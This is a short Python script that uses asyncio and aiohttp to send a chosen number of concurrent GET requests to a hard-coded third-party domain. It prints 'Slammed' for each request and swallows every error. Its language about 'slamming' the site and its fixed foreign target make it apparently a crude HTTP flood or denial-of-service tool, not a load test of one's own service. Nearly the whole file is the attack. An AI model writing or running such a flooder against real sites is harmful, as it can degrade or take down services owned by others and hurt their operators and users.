#!/usr/bin/env python3

import asyncio
import aiohttp
import sys
 
REQS_SENT = 0

async def send_req(url):
    global REQS_SENT
    try: 
        response = await aiohttp.request('GET', url)
        _ = await response.read()
    except Exception:
        pass
    print("Slammed {}".format(url))
    REQS_SENT += 1

 
BASE_URL = 'http://shitpe.com/'
tasks = [send_req('{}{}'.format(BASE_URL, cunt)) for cunt in range(int(sys.argv[1]))]
loop = asyncio.get_event_loop()
loop.run_until_complete(asyncio.wait(tasks))
loop.close()
print("--> Finished slamming {} {} times".format(BASE_URL, REQS_SENT))
